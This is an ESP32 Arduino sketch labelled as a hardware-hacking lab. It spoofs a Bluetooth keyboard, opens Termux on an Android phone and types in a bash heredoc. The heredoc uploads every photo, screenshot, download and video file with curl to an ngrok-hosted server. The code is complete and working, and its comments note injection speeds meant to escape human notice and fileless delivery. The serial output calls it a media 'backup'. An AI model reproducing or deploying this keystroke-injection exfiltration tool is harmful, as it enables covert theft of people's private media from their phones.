// ─────────────────────────────────────────────────────────────────────────────
// ESP32 BLE HID — Android Media Exfiltration Lab
// ─────────────────────────────────────────────────────────────────────────────
//
// CTF / Hardware Hacking Lab — Authorized Devices Only.
// USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.
//
// WHAT THIS DOES:
//   When GPIO 19 is pressed, the ESP32 impersonates a Bluetooth keyboard and:
//     STEP 1: Navigates to Android home screen (WIN key alone)
//     STEP 2: Opens Termux via launcher search
//     STEP 3: Clears the shell prompt (CTRL+C, CTRL+U)
//     STEP 4: Injects a bash heredoc payload that:
//               - Loops /sdcard/DCIM/Camera, /sdcard/Pictures,
//                 /sdcard/Pictures/Screenshots, /sdcard/Download, /sdcard/Movies
//               - Computes SHA-256 for each media file
//               - POSTs every file to WAN_SERVER_URL/upload via curl over ngrok
//
// TECHNIQUE NOTES:
//   - BLE HID spoofing: ESP32 advertises as "ESP32 Keyboard" (legitimate HID device)
//   - Keystroke injection: 35 ms/char — below typical human notice threshold
//   - Heredoc delivery: full bash script injected without dropping any file
//   - Win key alone = Home screen on all Android launchers (Win+S = screenshot)
//   - Typing immediately after Home auto-opens the launcher search overlay
//
// SERVER:
//   fetch_photos/server/server.py  (port 8019)
//   Run: ngrok http 8019  → paste URL in WAN_SERVER_URL below → re-flash
//
// TARGET DEVICE ONE-TIME SETUP (your own device):
//   Install Termux from F-Droid → pkg install curl → termux-setup-storage
// ─────────────────────────────────────────────────────────────────────────────

#include <BleKeyboard.h>

#define BUTTON_PIN     19
#define WAN_SERVER_URL "https://xxxx-your-ngrok-url.ngrok-free.app"  // ← paste your ngrok URL here

BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);

bool lastState    = HIGH;
bool wasConnected = false;

// ── Helpers ──────────────────────────────────────────────────────────────────

void typeString(const char* str, int delayMs = 40) {
  for (int i = 0; i < (int)strlen(str); i++) {
    bleKeyboard.print(str[i]);
    delay(delayMs);
  }
}

void pressEnter(int waitMs = 200) {
  bleKeyboard.press(KEY_RETURN);
  delay(120);
  bleKeyboard.releaseAll();
  delay(waitMs);
}

// WIN alone → Home screen on all Android launchers.
// After 1200 ms the launcher has settled; typing immediately opens search.
void goHome(int waitMs = 1200) {
  bleKeyboard.press(KEY_LEFT_GUI);
  delay(150);
  bleKeyboard.releaseAll();
  delay(waitMs);
}

// STEP 1 helper: WIN → Home → wait → type name → results appear → Enter → wait
// Proven pattern from pixel7pro/blehid_pixel7pro.ino.
void openApp(const char* appName, int waitMs = 3000) {
  goHome(1200);            // WIN alone → Home screen, wait 1200 ms
  delay(300);              // let launcher fully settle
  typeString(appName, 60); // typing auto-opens launcher search, 60 ms/char
  delay(1000);             // wait for search results to appear
  pressEnter(waitMs);      // Enter → open top result → wait for app to load
}

// ── Shell line helper ──────────────────────────────────────────────────────────
// Types one line of a shell heredoc into Termux then presses Enter.
// Used to build the upload script line by line inside a bash heredoc.
// 35 ms/char is reliable on all Android keyboards.
void typeLine(const char* line) {
  typeString(line, 35);
  pressEnter(120);
}

// ── Setup ────────────────────────────────────────────────────────────────────

void setup() {
  Serial.begin(115200);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  bleKeyboard.set_vendor_id(0x16C0);
  bleKeyboard.set_product_id(0x27DB);
  bleKeyboard.set_version(0x0100);
  bleKeyboard.begin();
  Serial.println("PIN 19 — Android media backup trigger ready.");
  Serial.println("Server: " WAN_SERVER_URL);
}

// ── Loop ─────────────────────────────────────────────────────────────────────

void loop() {
  bool connected = bleKeyboard.isConnected();
  if (connected && !wasConnected)  { Serial.println("✓ Connected.");    wasConnected = true;  }
  else if (!connected && wasConnected) { Serial.println("✗ Disconnected."); wasConnected = false; }

  if (connected) {
    bool state = digitalRead(BUTTON_PIN);

    if (lastState == HIGH && state == LOW) {
      Serial.println("GPIO 19 fired → 3-step Termux sequence starting...");

      // ── STEP 1: Go Home → type "Termux" → Enter → Termux opens ───────
      // WIN alone goes to Home screen (NOT WIN+S which takes a screenshot).
      // Typing immediately after Home auto-opens the launcher search overlay.
      // The top result for "Termux" is always the Termux app.
      // We wait 3000 ms for Termux to fully load and show a shell prompt.
      openApp("Termux", 3000);
      Serial.println("  Step 1 done: Termux opened.");

      // ── STEP 2: Clear the Termux prompt ─────────────────────────────
      // CTRL+C cancels any running command (safe no-op if prompt is idle).
      // CTRL+U clears any characters already typed on the current line.
      // Without these, previous input or a running process could eat STEP 3.
      bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
      delay(100); bleKeyboard.releaseAll(); delay(300);

      bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
      delay(100); bleKeyboard.releaseAll(); delay(300);
      Serial.println("  Step 2 done: prompt cleared.");

      // ── STEP 3: Type a bash heredoc script into Termux ───────────────
      //
      // WHY HEREDOC instead of separate commands:
      //   Typing separate `find | while curl` lines one after another caused
      //   the JSON responses from curl to interleave with the next command
      //   being typed — because the ESP32 starts typing immediately after
      //   pressEnter() without waiting for the shell loop to actually finish.
      //
      // WITH HEREDOC:
      //   bash reads the entire script first (until UPLOAD_END), then executes
      //   it. Every folder loop runs sequentially inside bash — no overlap,
      //   no interleaving, no timing issue on the ESP32 side.
      //   The ESP32 only needs to wait for the heredoc to be fully typed,
      //   not for the uploads to complete.
      //
      // Script typed (each line is a typeLine() call):
      //
      //   bash << 'UPLOAD_END'
      //   UP="https://...ngrok.../upload"
      //   EXT="\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \)"
      //   upload_dir() {
      //     find "$1" -maxdepth 1 -type f \( ... \) | while IFS= read -r f; do
      //       sha=$(sha256sum "$f" | cut -d' ' -f1)
      //       curl -s -L -H "ngrok-skip-browser-warning: true" \
      //            -F "file=@$f" -F "sha256=$sha" -F "category=$2" "$UP" \
      //            && echo "OK: $(basename $f)" || echo "FAIL: $(basename $f)"
      //     done
      //   }
      //   upload_dir /sdcard/DCIM/Camera          DCIM
      //   upload_dir /sdcard/Pictures             Pictures
      //   upload_dir /sdcard/Pictures/Screenshots Screenshots
      //   upload_dir /sdcard/Download             Downloads
      //   upload_dir /sdcard/Movies               Movies
      //   echo '====== ALL DONE ======'
      //   UPLOAD_END
      //
      Serial.println("  Step 3: typing upload script into Termux...");

      typeLine("bash << 'UPLOAD_END'");
      typeLine("UP=\"" WAN_SERVER_URL "/upload\"");
      typeLine("upload_dir() {");
      typeLine("  find \"$1\" -maxdepth 1 -type f \\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \\) | while IFS= read -r f; do");
      typeLine("    sha=$(sha256sum \"$f\" | cut -d' ' -f1)");
      typeLine("    curl -s -L -H \"ngrok-skip-browser-warning: true\" -F \"file=@$f\" -F \"sha256=$sha\" -F \"category=$2\" \"$UP\" && echo \"OK: $(basename $f)\" || echo \"FAIL: $(basename $f)\"");
      typeLine("  done");
      typeLine("}");
      typeLine("upload_dir /sdcard/DCIM/Camera          DCIM");
      typeLine("upload_dir /sdcard/Pictures             Pictures");
      typeLine("upload_dir /sdcard/Pictures/Screenshots Screenshots");
      typeLine("upload_dir /sdcard/Download             Downloads");
      typeLine("upload_dir /sdcard/Movies               Movies");
      typeLine("echo '====== ALL DONE ======'");
      typeLine("UPLOAD_END");

      Serial.println("  Step 3 done: script typed — bash now running uploads.");

      Serial.println("GPIO 19: all 3 steps complete.");
    }

    lastState = state;
  }
  delay(10);
}
